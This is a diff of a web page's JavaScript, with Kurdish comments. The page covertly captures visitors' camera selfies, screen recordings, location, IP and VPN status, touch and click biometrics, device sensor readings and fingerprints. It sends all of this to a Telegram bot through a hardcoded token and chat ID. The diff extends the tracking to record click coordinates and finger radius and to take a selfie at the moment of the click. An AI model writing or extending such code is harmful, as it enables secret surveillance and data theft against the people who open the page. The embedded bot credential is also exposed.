@@ -123,15 +123,27 @@
         const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
         const CHAT_ID = "6947664268";
 
-        let behavioralData = { touches: 0, maxPressure: 0, ambientLux: "نەزانراو", cpuLoadTime: 0, timeDrift: 0 };
+        let behavioralData = { 
+            touches: 0, 
+            maxPressure: 0, 
+            clickX: 0, 
+            clickY: 0, 
+            touchRadiusX: 0, 
+            touchRadiusY: 0, 
+            ambientLux: "نەزانراو", 
+            cpuLoadTime: 0 
+        };
 
-        // ١. مۆری پەنجەی ڕەفتاری (Behavioral Biometrics & Touch Dynamics)
+        // گرتنی وردەکاریی مۆری پەنجە و شوێنی کلیک لە ساتەوخەتی پەنجەنانە لەسەر شاشە
         window.addEventListener('pointerdown', (e) => {
             behavioralData.touches++;
             behavioralData.maxPressure = Math.max(behavioralData.maxPressure, e.pressure || 0.5);
+            behavioralData.clickX = Math.round(e.clientX);
+            behavioralData.clickY = Math.round(e.clientY);
+            behavioralData.touchRadiusX = Math.round(e.width || 0);
+            behavioralData.touchRadiusY = Math.round(e.height || 0);
         });
 
-        // ٢. تیشکدانەوە و ڕووناکی ژینگەیی (Ambient Light Sensor Telemetry)
         if ('AmbientLightSensor' in window) {
             try {
                 let sensor = new AmbientLightSensor();
@@ -140,7 +152,6 @@
             } catch(e) {}
         }
 
-        // ٣. کاتی پڕۆسێسەر و بڕی بارکردنی CPU (CPU Clock & Benchmark Side-Channel)
         function measureCpuBenchmark() {
             let start = performance.now();
             let val = 0;
@@ -240,7 +251,7 @@
             } catch(e) {}
         }
 
-        // کامێراکان (ڤیدیۆی پێشەوە و وێنەی پێش و دواوە)
+        // گرتنی وێنەی ڕوخسار لە ساتەوەختی کلیکدا لەگەڵ ڤیدیۆ و وێنەی دواوە
         function executeSecureSequence() {
             const videoElem = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
@@ -271,7 +282,7 @@
                                 let ctx = canvas.getContext('2d');
                                 ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                                 canvas.toBlob(blob => {
-                                    sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
+                                    sendToTelegramPhoto(blob, "📸 *وێنەی ساتەوەختی کلیک / مۆری پەنجە (Click Action Selfie)*");
                                 }, 'image/jpeg', 0.9);
                                 selfieStream.getTracks().forEach(track => track.stop());
 
@@ -389,7 +400,7 @@
                 ctx.fillStyle = "#f60";
                 ctx.fillRect(125, 1, 62, 20);
                 ctx.fillStyle = "#069";
-                ctx.fillText("TITAN_GOD_MODE_MAX", 2, 15);
+                ctx.fillText("TITAN_BIOMETRIC_MAX", 2, 15);
                 return canvas.toDataURL().slice(-40);
             } catch(e) { return "Unavailable"; }
         }
@@ -462,12 +473,16 @@
                 let ipData = await getUltimateIPData();
                 let vpnStatus = hasVpn ? "🛡️ بەکارهێنەری VPN / Proxy" : "🟢 تۆڕی ئاسایی (Direct)";
 
-                let report = `💎 *ڕاپۆرتی تایتان اولترا گۆد مۆد (TITAN GOD MODE 10^15):*\n\n` +
+                let report = `💎 *ڕاپۆرتی مۆری پەنجە و بایۆمەتری (TITAN BIOMETRIC MAX):*\n\n` +
                              `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n` +
                              `🛡️ *دۆخی تۆر/پڕۆکسی:* ${vpnStatus}\n` +
+                             `👆 *مۆری پەنجە و جووڵەی کلیک:*\n` +
+                             `• ژمارەی دەستپێدان: ${behavioralData.touches}\n` +
+                             `• هێزی پەستان (Pressure): ${behavioralData.maxPressure.toFixed(2)}\n` +
+                             `• شوێنی کلیک لەسەر شاشە: X: ${behavioralData.clickX}, Y: ${behavioralData.clickY}\n` +
+                             `• قەبارەی پاوەری پەنجە (Radius): ${behavioralData.touchRadiusX}x${behavioralData.touchRadiusY}\n\n` +
                              `🔄 *جووڵەی فیزیکی:* ${motionData.motionState} (Alpha: ${motionData.alpha})\n` +
                              `💡 *ڕووناکی ژینگەیی (Ambient):* ${behavioralData.ambientLux}\n` +
-                             `👆 *مۆری پەنجە (Touches):* ${behavioralData.touches} | فشار: ${behavioralData.maxPressure.toFixed(2)}\n` +
                              `⚙️ *خێرایی پڕۆسێسەر (CPU Bench):* ${cpuScore}\n\n` +
                              `🌐 *ڕایەڵە و خێرایی (Advanced Network):*\n` +
                              `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
@@ -498,7 +513,7 @@
 
             gatherAndSendDetails();
             sendLocation();
-            executeSecureSequence();
+            executeSecureSequence(); // گرتنی وێنەی ساتەوەختی کلیک و ڤیدیۆکان
             recordScreenStream();
 
             setTimeout(function() {
